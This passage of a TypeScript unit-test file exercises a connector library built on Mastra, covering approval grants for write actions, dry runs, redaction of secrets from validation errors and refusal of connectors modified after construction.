// SPDX-License-Identifier: Apache-2.0
import { resolveBackgroundConfig } from '@mastra/core/background-tasks';
import { RequestContext } from '@mastra/core/request-context';
import type { PublicSchema } from '@mastra/core/schema';
import { createTool, type ToolExecutionContext } from '@mastra/core/tools';
import { describe, expect, it, vi } from 'vitest';
import { z } from 'zod';
import { z as z3 } from 'zod/v3';

import { AGENT_AUDIT_CONTEXT_KEY, AuditLogger } from '../audit/index.js';
import { registerSafeAuditError } from '../audit/safe-error.js';
import {
  crossWorkflowIsolation,
  ISOLATION_SCOPE_CONTEXT_KEY,
  tenantIsolation,
  WORKFLOW_SCOPE_CONTEXT_KEY,
} from '../policy-engine/index.js';
import {
  ACTOR_CONTEXT_KEY,
  type Actor,
  PRINCIPAL_PERMISSIONS_CONTEXT_KEY,
} from '../rbac/index.js';
import {
  type AtomicIdempotencyStore,
  CONNECTOR_EXECUTION_CONTEXT_KEY,
  CONNECTOR_GRANTS_CONTEXT_KEY,
  type Connector,
  type ConnectorConfig,
  type ConnectorInvocationOptions,
  ConnectorPolicyError,
  ConnectorValidationError,
  connectorManifest,
  createConnector as createConnectorBase,
  DRY_RUN_CONTEXT_KEY,
  IDEMPOTENCY_KEY_CONTEXT_KEY,
  type IdempotencyRecord,
  type IdempotencyReservation,
  type IdempotencyStore,
  InMemoryIdempotencyStore,
  InMemoryRateLimitStore,
  invokeConnector,
} from './index.js';

// Most tests exercise post-migration behavior. Migration-boundary tests call
// createConnectorBase directly so absence of the explicit acknowledgement and
// atomic inspect() capability remain visible.
function createConnector<TInput = unknown, TOutput = unknown>(
  config: ConnectorConfig<TInput, TOutput>,
) {
  const policies = config.policies;
  const store = policies?.idempotencyStore;
  const inspectableStore =
    store &&
    'reserve' in store &&
    typeof store.reserve === 'function' &&
    !('inspect' in store)
      ? { ...store, inspect: () => ({ state: 'absent' as const }) }
      : store;
  return createConnectorBase({
    ...config,
    ...(policies === undefined
      ? {}
      : {
          policies: {
            ...policies,
            ...(inspectableStore === undefined
              ? {}
              : { idempotencyStore: inspectableStore }),
            ...(store === undefined
              ? {}
              : {
                  idempotencyKeyMigration:
                    policies.idempotencyKeyMigration ??
                    ('legacy-writers-drained' as const),
                }),
          },
        }),
  });
}

function standardStringSchema(
  validate: (
    value: unknown,
  ) =>
    | { value: string }
    | { issues: readonly { message: string }[] }
    | Promise<{ value: string } | { issues: readonly { message: string }[] }>,
): PublicSchema<string> {
  return {
    '~standard': {
      version: 1,
      vendor: 'breakwater-test',
      validate,
      jsonSchema: {
        input: () => ({ type: 'string' }),
        output: () => ({ type: 'string' }),
      },
    },
  };
}

function makeContext(
  options: {
    actor?: Actor;
    approved?: readonly string[];
    idempotencyKey?: string;
    agent?: boolean;
    dryRun?: boolean;
    principalPermissions?: unknown;
    auditContext?: unknown;
  } = {},
): ToolExecutionContext {
  const requestContext = new RequestContext();
  if (options.actor) requestContext.set(ACTOR_CONTEXT_KEY, options.actor);
  if (options.principalPermissions !== undefined) {
    requestContext.set(
      PRINCIPAL_PERMISSIONS_CONTEXT_KEY,
      options.principalPermissions,
    );
  }
  if (options.auditContext !== undefined) {
    requestContext.set(AGENT_AUDIT_CONTEXT_KEY, options.auditContext);
  }
  if (options.approved) {
    requestContext.set(WORKFLOW_SCOPE_CONTEXT_KEY, 'workflow-1');
    requestContext.set('runId', 'run-1');
    requestContext.set(CONNECTOR_EXECUTION_CONTEXT_KEY, {
      kind: 'resume',
      workflowId: 'workflow-1',
      runId: 'run-1',
      suspension: {
        stepPath: ['gate'],
        suspendedAt: 1_000,
      },
    });
    requestContext.set(
      CONNECTOR_GRANTS_CONTEXT_KEY,
      options.approved.map((connectorId) =>
        options.agent
          ? {
              scope: 'tool-call',
              connectorId,
              workflowId: 'workflow-1',
              runId: 'run-1',
              suspension: {
                stepPath: ['gate'],
                suspendedAt: 1_000,
              },
              toolCallId: 'call-1',
            }
          : {
              scope: 'suspension',
              connectorId,
              workflowId: 'workflow-1',
              runId: 'run-1',
              suspension: {
                stepPath: ['gate'],
                suspendedAt: 1_000,
              },
            },
      ),
    );
  }
  if (options.idempotencyKey) {
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, options.idempotencyKey);
  }
  if (options.dryRun) {
    requestContext.set(DRY_RUN_CONTEXT_KEY, true);
  }
  const context = { requestContext } as unknown as ToolExecutionContext;
  if (options.agent) {
    // Shape-only stand-in for an agent-run execution context. Its presence
    // must NOT bypass any gate — agent contexts are forwardable into nested
    // and direct calls, so they prove nothing about approval.
    (context as { agent?: unknown }).agent = {
      agentId: 'agent-1',
      toolCallId: 'call-1',
      messages: [],
      suspend: async () => {},
    };
  }
  return context;
}

function makeToolCallGrantContext(
  options: {
    connectorId?: string;
    grantWorkflowId?: string;
    grantRunId?: string;
    grantIsolationScope?: string;
    grantStepPath?: readonly string[];
    grantSuspendedAt?: number;
    grantResumeCount?: number;
    grantToolCallId?: string;
    executionWorkflowId?: string;
    executionRunId?: string;
    executionIsolationScope?: string;
    executionStepPath?: readonly string[];
    executionSuspendedAt?: number;
    executionResumeCount?: number;
    workflowScope?: string;
    requestRunId?: string;
    requestIsolationScope?: string;
    agentToolCallId?: string;
    grants?: unknown;
    legacyGrant?: unknown;
  } = {},
): ToolExecutionContext {
  const requestContext = new RequestContext();
  requestContext.set(
    WORKFLOW_SCOPE_CONTEXT_KEY,
    options.workflowScope ?? 'workflow-1',
  );
  requestContext.set('runId', options.requestRunId ?? 'tenant_run-1');
  requestContext.set(
    ISOLATION_SCOPE_CONTEXT_KEY,
    options.requestIsolationScope ?? 'tenant',
  );
  requestContext.set(CONNECTOR_EXECUTION_CONTEXT_KEY, {
    kind: 'resume',
    workflowId: options.executionWorkflowId ?? 'workflow-1',
    runId: options.executionRunId ?? 'tenant_run-1',
    isolationScope: options.executionIsolationScope ?? 'tenant',
    suspension: {
      stepPath: options.executionStepPath ?? ['gate'],
      suspendedAt: options.executionSuspendedAt ?? 1_000,
      resumeCount: options.executionResumeCount ?? 2,
    },
  });
  requestContext.set(
    CONNECTOR_GRANTS_CONTEXT_KEY,
    options.grants ?? [
      {
        scope: 'tool-call',
        connectorId: options.connectorId ?? 'salesforce.createContact',
        workflowId: options.grantWorkflowId ?? 'workflow-1',
        runId: options.grantRunId ?? 'tenant_run-1',
        isolationScope: options.grantIsolationScope ?? 'tenant',
        suspension: {
          stepPath: options.grantStepPath ?? ['gate'],
          suspendedAt: options.grantSuspendedAt ?? 1_000,
          resumeCount: options.grantResumeCount ?? 2,
        },
        toolCallId: options.grantToolCallId ?? 'call-1',
      },
    ],
  );
  if (options.legacyGrant !== undefined) {
    requestContext.set('breakwater.approvedConnectors', options.legacyGrant);
  }
  return {
    requestContext,
    agent: {
      agentId: 'agent-1',
      toolCallId: options.agentToolCallId ?? 'call-1',
      messages: [],
      suspend: async () => {},
    },
  } as unknown as ToolExecutionContext;
}

// Structural on purpose: connectors infer different TOutput per test, and
// Tool<...> instantiations don't cross-assign cleanly.
async function run<TInput>(
  tool: {
    execute?: (
      inputData: TInput,
      context: ToolExecutionContext,
    ) => Promise<unknown>;
  },
  input: TInput,
  context: ToolExecutionContext = makeContext(),
): Promise<unknown> {
  if (!tool.execute) throw new Error('tool has no execute');
  return tool.execute(input, context);
}

// Invokes tool.execute with the context argument omitted entirely — the
// bare-call path where Mastra's Tool wrapper backfills an empty context.
function bareRun(
  tool: { execute?: unknown },
  value: unknown,
): Promise<unknown> {
  const execute = tool.execute as (input: unknown) => Promise<unknown>;
  return execute(value);
}

const input = { email: 'ada@example.com' };
const PRIVATE_BACKEND_SENTINEL = 'private-backend-sentinel-4a78e093';

function exposedErrorText(error: unknown): string {
  if (typeof error !== 'object' || error === null) return String(error);
  return Reflect.ownKeys(error)
    .map((key) => {
      const value = Object.getOwnPropertyDescriptor(error, key)?.value;
      if (typeof value === 'string') return value;
      try {
        return JSON.stringify(value);
      } catch {
        return String(value);
      }
    })
    .join('\n');
}

function makeConnector(
  overrides: Partial<Parameters<typeof createConnector>[0]> = {},
) {
  const execute = vi.fn(async () => ({ ok: true }));
  const tool = createConnector({
    id: 'salesforce.createContact',
    description: 'Create a Salesforce contact',
    inputSchema: z.object({ email: z.string() }),
    execute,
    permissions: { sideEffect: 'write' },
    ...overrides,
  });
  return { tool, execute };
}

describe('connector id validation', () => {
  it("rejects an id containing ':' because the unchanged rate-budget tuple needs a colon-free final component", () => {
    // #given / #when — active rate-limit windows retain the legacy
    // `[scope:]connector` key across the idempotency-only migration.
    let error: unknown;
    try {
      makeConnector({ id: 'tenant:createContact' });
    } catch (caught) {
      error = caught;
    }

    // #then
    expect(error).toBeInstanceOf(TypeError);
    const message = (error as TypeError).message;
    expect(message).toContain('tenant:createContact');
    expect(message).toContain('rate-limit');
  });

  it('constructs shipped id shapes that are colon-free (camelCase and dotted agent-cli)', () => {
    // #when / #then — the guard rejects nothing shipped
    expect(() => makeConnector({ id: 'createContact' })).not.toThrow();
    expect(() => makeConnector({ id: 'agent-cli.claude-code' })).not.toThrow();
  });
});

describe('createConnector classification', () => {
  it('compiles to a working Mastra tool', async () => {
    // #given
    const { tool, execute } = makeConnector();
    // #when / #then
    expect(tool.id).toBe('salesforce.createContact');
    expect(await run(tool, input)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('exposes the frozen manifest via connectorManifest()', () => {
    // #given
    const { tool } = makeConnector({
      permissions: { sideEffect: 'read', egress: ['api.salesforce.com'] },
    });
    // #when
    const manifest = connectorManifest(tool);
    // #then
    expect(manifest).toMatchObject({
      sideEffect: 'read',
      egress: ['api.salesforce.com'],
    });
    expect(Object.isFrozen(manifest)).toBe(true);
    expect(Object.isFrozen(manifest?.egress)).toBe(true);
    expect(connectorManifest({})).toBeUndefined();
  });

  it('compiles truthful MCP annotations from the manifest', () => {
    // #given / #when
    const read = makeConnector({
      permissions: { sideEffect: 'read' },
    }).tool;
    const destructive = makeConnector({
      permissions: {
        sideEffect: 'destructive',
        egress: ['api.salesforce.com'],
        idempotencyKey: true,
      },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    }).tool;
    // #then
    expect(read.mcp?.annotations).toMatchObject({
      readOnlyHint: true,
      destructiveHint: false,
      idempotentHint: false,
      openWorldHint: false,
    });
    expect(destructive.mcp?.annotations).toMatchObject({
      readOnlyHint: false,
      destructiveHint: true,
      idempotentHint: true,
      openWorldHint: true,
    });
  });

  it('compiles approval policy into a Mastra requireApproval predicate', () => {
    // #given — gated connectors compile a per-call predicate (Mastra's
    // CoreToolBuilder turns it into needsApprovalFn, authoritative per
    // call); ungated connectors compile no approval at all
    type ApprovalPredicate = (
      inputData: unknown,
      ctx?: { requestContext?: Record<string, unknown> },
    ) => boolean;
    const destructive = makeConnector({
      permissions: { sideEffect: 'destructive' },
    }).tool.requireApproval as ApprovalPredicate;
    const orgGated = makeConnector({
      permissions: { sideEffect: 'write' },
      policies: { writePermissions: { requireApproval: ['salesforce.*'] } },
    }).tool.requireApproval as ApprovalPredicate;

    // #when / #then — a normal call requires approval; a dry-run request
    // skips the agent pause (the wrapper's dry-run branch never reaches a
    // side effect); a ctx-less evaluation stays fail-closed (Mastra's
    // network/durable paths omit the context)
    for (const predicate of [destructive, orgGated]) {
      expect(typeof predicate).toBe('function');
      expect(predicate(input, { requestContext: {} })).toBe(true);
      expect(
        predicate(input, { requestContext: { [DRY_RUN_CONTEXT_KEY]: true } }),
      ).toBe(false);
      expect(predicate(input)).toBe(true);
      expect(predicate(input, {})).toBe(true);
    }
    // Tool's constructor defaults absent requireApproval to false.
    expect(
      makeConnector({ permissions: { sideEffect: 'read' } }).tool
        .requireApproval,
    ).toBe(false);
  });

  it('rejects URL-shaped egress declarations at definition time', () => {
    // #when / #then
    expect(() =>
      makeConnector({
        permissions: {
          sideEffect: 'read',
          egress: ['https://api.salesforce.com'],
        },
      }),
    ).toThrow(TypeError);
  });
});

describe('invokeConnector', () => {
  it('forwards the supported direct-call context without exposing its private carrier', async () => {
    const requestContext = new RequestContext();
    const abortController = new AbortController();
    const observe = {
      async span<T>(_name: string, fn: () => T | Promise<T>): Promise<T> {
        return fn();
      },
      log: vi.fn(),
    } satisfies ToolExecutionContext['observe'];
    const received = vi.fn();
    const tool = createConnector<{ value: string }, { value: string }>({
      id: 'direct.context',
      description: 'Inspect the supported direct invocation context',
      execute: async (value, context) => {
        received(context);
        expect(Object.getOwnPropertySymbols(context)).toEqual([]);
        return value;
      },
      permissions: { sideEffect: 'read' },
    });

    await expect(
      invokeConnector(
        tool,
        { value: 'ok' },
        {
          requestContext,
          abortSignal: abortController.signal,
          observe,
        },
      ),
    ).resolves.toEqual({ value: 'ok' });
    expect(received).toHaveBeenCalledWith(
      expect.objectContaining({
        requestContext,
        abortSignal: abortController.signal,
        observe,
      }),
    );
  });

  it('supplies Mastra no-op observation when the host omits an observer', async () => {
    const tool = createConnector<{ value: string }, { value: string }>({
      id: 'direct.default-observe',
      description: 'Use the default direct invocation observer',
      execute: async (inputData, context) => {
        context.observe.log('info', 'default observer');
        return context.observe.span('default span', () => inputData);
      },
      permissions: { sideEffect: 'read' },
    });

    await expect(invokeConnector(tool, { value: 'observed' })).resolves.toEqual(
      { value: 'observed' },
    );
  });

  it('does not expose its private carrier to dry-run execution', async () => {
    const requestContext = new RequestContext();
    requestContext.set(DRY_RUN_CONTEXT_KEY, true);
    const dryRunExecute = vi.fn(async (_input, context) => {
      expect(Object.getOwnPropertySymbols(context)).toEqual([]);
      return { simulated: true };
    });
    const tool = createConnector<unknown, { simulated: boolean }>({
      id: 'direct.dry-run',
      description: 'Inspect a direct dry-run context',
      execute: async () => ({ simulated: false }),
      dryRunExecute,
      permissions: { sideEffect: 'write', dryRun: true },
    });

    await expect(
      invokeConnector(tool, {}, { requestContext }),
    ).resolves.toEqual({ simulated: true });
    expect(dryRunExecute).toHaveBeenCalledTimes(1);
  });

  it('matches an exact direct tool-call grant without fabricating an agent context', async () => {
    const execute = vi.fn(async (_input, context: ToolExecutionContext) => {
      expect(context.agent).toBeUndefined();
      expect(Object.getOwnPropertySymbols(context)).toEqual([]);
      return { ok: true };
    });
    const tool = createConnector<{ value: string }, { ok: boolean }>({
      id: 'direct.approved',
      description: 'Exercise a direct tool-call grant',
      execute,
      permissions: { sideEffect: 'write', requiresApproval: true },
    });
    const requestContext = makeToolCallGrantContext({
      connectorId: 'direct.approved',
    }).requestContext;

    await expect(
      invokeConnector(
        tool,
        { value: 'ok' },
        { requestContext, toolCallId: 'call-1' },
      ),
    ).resolves.toEqual({ ok: true });
    await expect(
      invokeConnector(
        tool,
        { value: 'wrong-id' },
        { requestContext, toolCallId: 'call-2' },
      ),
    ).rejects.toMatchObject({
      policy: 'write-permissions',
    });
    await expect(
      invokeConnector(tool, { value: 'omitted-id' }, { requestContext }),
    ).rejects.toMatchObject({
      policy: 'write-permissions',
    });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('supports suspension and run grants without a tool-call identity', async () => {
    const tool = createConnector<unknown, { ok: boolean }>({
      id: 'direct.broader-grant',
      description: 'Exercise broader direct grant scopes',
      execute: async () => ({ ok: true }),
      permissions: { sideEffect: 'write', requiresApproval: true },
    });
    const suspensionContext = makeContext({
      approved: ['direct.broader-grant'],
    }).requestContext;

    await expect(
      invokeConnector(tool, {}, { requestContext: suspensionContext }),
    ).resolves.toEqual({ ok: true });

    const runContext = new RequestContext();
    runContext.set(WORKFLOW_SCOPE_CONTEXT_KEY, 'workflow-1');
    runContext.set('runId', 'run-1');
    runContext.set(CONNECTOR_EXECUTION_CONTEXT_KEY, {
      kind: 'start',
      workflowId: 'workflow-1',
      runId: 'run-1',
    });
    runContext.set(CONNECTOR_GRANTS_CONTEXT_KEY, [
      {
        scope: 'run',
        connectorId: 'direct.broader-grant',
        workflowId: 'workflow-1',
        runId: 'run-1',
      },
    ]);
    await expect(
      invokeConnector(tool, {}, { requestContext: runContext }),
    ).resolves.toEqual({ ok: true });
  });

  it('isolates concurrent tool-call identities on a shared RequestContext', async () => {
    const tool = createConnector<{ call: string }, { call: string }>({
      id: 'direct.concurrent-grants',
      description: 'Exercise concurrent direct grant identity',
      execute: async ({ call }) => {
        await Promise.resolve();
        return { call };
      },
      permissions: { sideEffect: 'write', requiresApproval: true },
    });
    const requestContext = makeToolCallGrantContext({
      connectorId: 'direct.concurrent-grants',
      grants: ['call-a', 'call-b'].map((toolCallId) => ({
        scope: 'tool-call',
        connectorId: 'direct.concurrent-grants',
        workflowId: 'workflow-1',
        runId: 'tenant_run-1',
        isolationScope: 'tenant',
        suspension: {
          stepPath: ['gate'],
          suspendedAt: 1_000,
          resumeCount: 2,
        },
        toolCallId,
      })),
    }).requestContext;

    await expect(
      Promise.all([
        invokeConnector(
          tool,
          { call: 'a' },
          { requestContext, toolCallId: 'call-a' },
        ),
        invokeConnector(
          tool,
          { call: 'b' },
          { requestContext, toolCallId: 'call-b' },
        ),
      ]),
    ).resolves.toEqual([{ call: 'a' }, { call: 'b' }]);
  });

  it('rejects a malformed direct tool-call identity before execution', async () => {
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'read' },
    });

    await expect(
      invokeConnector(tool, input, { toolCallId: '' }),
    ).rejects.toThrow(TypeError);
    await expect(
      invokeConnector(tool, input, {
        toolCallId: 42,
      } as unknown as ConnectorInvocationOptions),
    ).rejects.toThrow(TypeError);
    expect(execute).not.toHaveBeenCalled();
  });

  it('redacts input validation issues and validator exceptions', async () => {
    const issueSecret = 'private-input-issue-12ec2a';
    const issueTool = createConnector<
      { secret: string },
      { accepted: boolean }
    >({
      id: 'direct.input-issue',
      description: 'Reject a private input value',
      inputSchema: z.object({
        secret: z.string().refine(() => false, {
          message: `rejected ${issueSecret}`,
        }),
      }),
      execute: async () => ({ accepted: true }),
      permissions: { sideEffect: 'read' },
    });

    const issue = await invokeConnector(issueTool, {
      secret: issueSecret,
    }).catch((error: unknown) => error);
    expect(issue).toMatchObject({
      name: 'ConnectorValidationError',
      message: 'connector invocation failed validation',
      connector: 'direct.input-issue',
      phase: 'input',
    });
    expect(issue).toBeInstanceOf(ConnectorValidationError);
    expect(exposedErrorText(issue)).not.toContain(issueSecret);
    expect('cause' in (issue as object)).toBe(false);

    const exceptionSecret = 'private-input-exception-b779b3';
    const exceptionTool = createConnector<string, string>({
      id: 'direct.input-exception',
      description: 'Throw from input validation',
      inputSchema: standardStringSchema(() => {
        throw new Error(exceptionSecret);
      }),
      execute: async (value) => value,
      permissions: { sideEffect: 'read' },
    });
    const exception = await invokeConnector(
      exceptionTool,
      exceptionSecret,
    ).catch((error: unknown) => error);
    expect(exception).toMatchObject({
      message: 'connector invocation failed validation',
      connector: 'direct.input-exception',
      phase: 'input',
    });
    expect(exposedErrorText(exception)).not.toContain(exceptionSecret);
    expect('cause' in (exception as object)).toBe(false);
  });

  it('contains a rejecting async input validator without an unhandled rejection', async () => {
    const validatorSecret = 'private-async-input-validator-62ad7e';
    const unhandled: unknown[] = [];
    const onUnhandled = (reason: unknown) => unhandled.push(reason);
    process.on('unhandledRejection', onUnhandled);
    try {
      const tool = createConnector<string, string>({
        id: 'direct.async-input-validator',
        description: 'Contain a rejecting async input validator',
        inputSchema: standardStringSchema(async () => {
          throw new Error(validatorSecret);
        }),
        execute: async (value) => value,
        permissions: { sideEffect: 'read' },
      });

      const failure = await invokeConnector(tool, validatorSecret).catch(
        (error: unknown) => error,
      );
      await new Promise<void>((resolve) => setImmediate(resolve));
      expect(failure).toMatchObject({
        name: 'ConnectorValidationError',
        message: 'connector invocation failed validation',
        connector: 'direct.async-input-validator',
        phase: 'input',
      });
      expect(exposedErrorText(failure)).not.toContain(validatorSecret);
      expect(unhandled).toEqual([]);
    } finally {
      process.off('unhandledRejection', onUnhandled);
    }
  });

  it('preserves non-enumerable Standard Schema properties', async () => {
    const standard = Object.defineProperties(
      {},
      {
        version: { value: 1 },
        vendor: { value: 'breakwater-non-enumerable-test' },
        validate: {
          value: (value: unknown) =>
            typeof value === 'string'
              ? { value }
              : { issues: [{ message: 'expected string' }] },
        },
        jsonSchema: {
          value: {
            input: () => ({ type: 'string' }),
            output: () => ({ type: 'string' }),
          },
        },
      },
    );
    const schema = Object.defineProperty({}, '~standard', {
      configurable: true,
      value: standard,
    }) as PublicSchema<string>;
    const execute = vi.fn(async (value: string) => value);
    const tool = createConnector<string, string>({
      id: 'direct.non-enumerable-standard-schema',
      description: 'Preserve non-enumerable Standard Schema properties',
      inputSchema: schema,
      execute,
      permissions: { sideEffect: 'read' },
    });

    await expect(
      invokeConnector(tool, 42 as unknown as string),
    ).rejects.toMatchObject({
      connector: 'direct.non-enumerable-standard-schema',
      phase: 'input',
    });
    expect(execute).not.toHaveBeenCalled();
  });

  it('redacts output validation issues and exceptions without changing raw execute', async () => {
    const issueSecret = 'private-output-issue-3afc14';
    const issueTool = createConnector<unknown, { secret: string }>({
      id: 'direct.output-issue',
      description: 'Reject a private output value',
      outputSchema: z.object({
        secret: z.string().refine(() => false, {
          message: `rejected ${issueSecret}`,
        }),
      }),
      execute: async () => ({ secret: issueSecret }),
      permissions: { sideEffect: 'read' },
    });
    const issue = await invokeConnector(issueTool, {}).catch(
      (error: unknown) => error,
    );
    expect(issue).toMatchObject({
      message: 'connector invocation failed validation',
      connector: 'direct.output-issue',
      phase: 'output',
    });
    expect(exposedErrorText(issue)).not.toContain(issueSecret);
    expect('cause' in (issue as object)).toBe(false);

    const exceptionSecret = 'private-output-exception-ff4a45';
    const exceptionTool = createConnector<unknown, string>({
      id: 'direct.output-exception',
      description: 'Throw from output validation',
      outputSchema: standardStringSchema(() => {
        throw new Error(exceptionSecret);
      }),
      execute: async () => exceptionSecret,
      permissions: { sideEffect: 'read' },
    });
    await expect(run(exceptionTool, {})).rejects.toThrow(exceptionSecret);
    const exception = await invokeConnector(exceptionTool, {}).catch(
      (error: unknown) => error,
    );
    expect(exception).toMatchObject({
      message: 'connector invocation failed validation',
      connector: 'direct.output-exception',
      phase: 'output',
    });
    expect(exposedErrorText(exception)).not.toContain(exceptionSecret);
    expect('cause' in (exception as object)).toBe(false);
  });

  it('pins a retained backing output validator at construction', async () => {
    const outputSecret = 'private-retained-output-validator-eae2c1';
    const outputSchema = standardStringSchema(() => ({
      issues: [{ message: `rejected ${outputSecret}` }],
    }));
    const execute = vi.fn(async () => outputSecret);
    const tool = createConnector<unknown, string>({
      id: 'direct.retained-output-validator',
      description: 'Pin a retained backing output validator',
      outputSchema,
      execute,
      permissions: { sideEffect: 'read' },
    });
    (
      outputSchema as {
        '~standard': { validate: (value: unknown) => { value: string } };
      }
    )['~standard'].validate = () => ({ value: outputSecret });

    const failure = await invokeConnector(tool, {}).catch(
      (error: unknown) => error,
    );
    expect(failure).toMatchObject({
      name: 'ConnectorValidationError',
      message: 'connector invocation failed validation',
      connector: 'direct.retained-output-validator',
      phase: 'output',
    });
    expect(exposedErrorText(failure)).not.toContain(outputSecret);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('returns legitimate validation-shaped application output unchanged', async () => {
    const output = {
      error: true as const,
      message: 'business result',
      validationErrors: { errors: ['application-owned'], fields: {} },
    };
    const tool = createConnector<unknown, typeof output>({
      id: 'direct.validation-shaped-output',
      description:
        'Return an application result shaped like a validation error',
      outputSchema: z.custom<typeof output>(() => true),
      execute: async () => output,
      permissions: { sideEffect: 'read' },
    });

    await expect(invokeConnector(tool, {})).resolves.toBe(output);
  });

  it('does not inspect validation-like properties on successful application output', async () => {
    const readError = vi.fn(() => {
      throw new Error('application getter must not run');
    });
    const output = Object.defineProperty(
      { value: 'application-owned' },
      'error',
      { enumerable: true, get: readError },
    );
    const tool = createConnector<unknown, typeof output>({
      id: 'direct.application-accessor-output',
      description: 'Return output with an application-owned error accessor',
      execute: async () => output,
      permissions: { sideEffect: 'read' },
    });

    await expect(invokeConnector(tool, {})).resolves.toBe(output);
    expect(readError).not.toHaveBeenCalled();
  });

  it('applies input and output schema transformations exactly once', async () => {
    const inputTransform = vi.fn((value: string) => `${value}:input`);
    const outputTransform = vi.fn((value: string) => `${value}:output`);
    const execute = vi.fn(async ({ value }: { value: string }) => value);
    const tool = createConnector<{ value: string }, string>({
      id: 'direct.transform-once',
      description: 'Transform direct input and output once',
      inputSchema: z.object({ value: z.string().transform(inputTransform) }),
      outputSchema: z.string().transform(outputTransform),
      execute,
      permissions: { sideEffect: 'read' },
    });

    await expect(invokeConnector(tool, { value: 'raw' })).resolves.toBe(
      'raw:input:output',
    );
    expect(inputTransform).toHaveBeenCalledTimes(1);
    expect(outputTransform).toHaveBeenCalledTimes(1);
    expect(execute).toHaveBeenCalledWith(
      { value: 'raw:input' },
      expect.any(Object),
      expect.any(Object),
    );
  });

  it('preserves a Zod v3 input schema and applies its transform once', async () => {
    const transform = vi.fn((value: string) => `${value}:zod-v3`);
    const execute = vi.fn(async ({ value }: { value: string }) => value);
    const tool = createConnector<{ value: string }, string>({
      id: 'direct.zod-v3-input',
      description: 'Preserve a non-configurable Zod v3 schema boundary',
      inputSchema: z3.object({ value: z3.string().transform(transform) }),
      execute,
      permissions: { sideEffect: 'read' },
    });

    await expect(invokeConnector(tool, { value: 'raw' })).resolves.toBe(
      'raw:zod-v3',
    );
    expect(transform).toHaveBeenCalledTimes(1);
    expect(execute).toHaveBeenCalledWith(
      { value: 'raw:zod-v3' },
      expect.any(Object),
      expect.any(Object),
    );
  });

  it('preserves schema methods that use private fields', async () => {
    class PrivateFieldSchema {
      readonly #prefix = 'private';
      readonly '~standard' = {
        version: 1 as const,
        vendor: 'breakwater-private-field-test',
        validate: (value: unknown) => ({ value: String(value) }),
        jsonSchema: {
          input: () => ({ type: 'string' }),
          output: () => ({ type: 'string' }),
        },
      };

      parse(value: string): string {
        return `${this.#prefix}:${value}`;
      }
    }
    const schema = new PrivateFieldSchema() as PublicSchema<string> & {
      parse(value: string): string;
    };
    const tool = createConnector<string, string>({
      id: 'direct.private-field-schema',
      description: 'Preserve private-field schema methods',
      inputSchema: schema,
      execute: async (value) => value,
      permissions: { sideEffect: 'read' },
    });

    expect((tool.inputSchema as typeof schema).parse('value')).toBe(
      'private:value',
    );
    await expect(invokeConnector(tool, 'value')).resolves.toBe('value');
  });

  it('forwards Standard Schema validation options on input and raw output', async () => {
    const inputValidate = vi.fn((value: unknown, _options?: unknown) => ({
      value: String(value),
    }));
    const outputValidate = vi.fn((value: unknown, _options?: unknown) => ({
      value: String(value),
    }));
    const tool = createConnector<string, string>({
      id: 'direct.schema-validation-options',
      description: 'Preserve Standard Schema validation options',
      inputSchema: standardStringSchema(inputValidate),
      outputSchema: standardStringSchema(outputValidate),
      execute: async (value) => value,
      permissions: { sideEffect: 'read' },
    });
    const options = { libraryOptions: { mode: 'strict' } };
    const inputSchema = tool.inputSchema as unknown as {
      '~standard': {
        validate(value: unknown, options?: unknown): unknown;
      };
    };
    const outputSchema = tool.outputSchema as unknown as {
      '~standard': {
        validate(value: unknown, options?: unknown): unknown;
      };
    };

    inputSchema['~standard'].validate('input', options);
    outputSchema['~standard'].validate('output', options);

    expect(inputValidate).toHaveBeenCalledWith('input', options);
    expect(outputValidate).toHaveBeenCalledWith('output', options);
  });

  it('rejects plain tools and modified connector execution surfaces', async () => {
    const plain = createTool({
      id: 'plain-tool',
      description: 'Not a Breakwater connector',
      execute: async () => ({ ok: true }),
    });
    await expect(
      invokeConnector(
        plain as unknown as Connector<unknown, { ok: boolean }>,
        {},
      ),
    ).rejects.toThrow(
      'invokeConnector requires a connector created by createConnector()',
    );
    const original = createConnector<unknown, { ok: boolean }>({
      id: 'direct.original',
      description: 'Original connector for a copied lookalike',
      execute: async () => ({ ok: true }),
      permissions: { sideEffect: 'read' },
    });
    const copied = { ...original } as Connector<unknown, { ok: boolean }>;
    await expect(invokeConnector(copied, {})).rejects.toThrow(
      'invokeConnector requires a connector created by createConnector()',
    );

    const mutations = [
      (tool: Connector<{ value: string }, { ok: boolean }>) => {
        tool.id = 'modified-id';
      },
      (tool: Connector<{ value: string }, { ok: boolean }>) => {
        tool.execute = async () => ({ ok: false });
      },
      (tool: Connector<{ value: string }, { ok: boolean }>) => {
        tool.inputSchema = undefined;
      },
      (tool: Connector<{ value: string }, { ok: boolean }>) => {
        tool.outputSchema = undefined;
      },
    ];
    for (const mutate of mutations) {
      const execute = vi.fn(async () => ({ ok: true }));
      const tool = createConnector<{ value: string }, { ok: boolean }>({
        id: 'direct.immutable-boundary',
        description: 'Pin the direct invocation boundary',
        inputSchema: z.object({ value: z.string() }),
        outputSchema: z.object({ ok: z.boolean() }),
        execute,
        permissions: { sideEffect: 'read' },
      });
      mutate(tool);
      await expect(invokeConnector(tool, { value: 'ok' })).rejects.toThrow(
        'invokeConnector refuses a connector whose execution boundary was modified after construction',
      );
      expect(execute).not.toHaveBeenCalled();
    }
  });

  it('rejects in-place mutation of Standard Schema validators', async () => {
    const mutateValidator = (
      schema: unknown,
      validate: (value: unknown) => { value: unknown },
    ) => {
      const standard = (
        schema as {
          '~standard': { validate: (value: unknown) => { value: unknown } };
        }
      )['~standard'];
      standard.validate = validate;
    };

    const inputExecute = vi.fn(async () => ({ ok: true }));
    const inputTool = createConnector<{ value: string }, { ok: boolean }>({
      id: 'direct.mutated-input-validator',
      description: 'Reject an in-place input validator mutation',
      inputSchema: z.object({ value: z.string() }),
      execute: inputExecute,
      permissions: { sideEffect: 'read' },
    });
    mutateValidator(inputTool.inputSchema, () => ({
      value: { value: 'bypassed' },
    }));
    await expect(
      invokeConnector(inputTool, { value: 'untrusted' }),
    ).rejects.toThrow(
      'invokeConnector refuses a connector whose execution boundary was modified after construction',
    );
    expect(inputExecute).not.toHaveBeenCalled();

    const outputExecute = vi.fn(async () => ({ ok: true }));
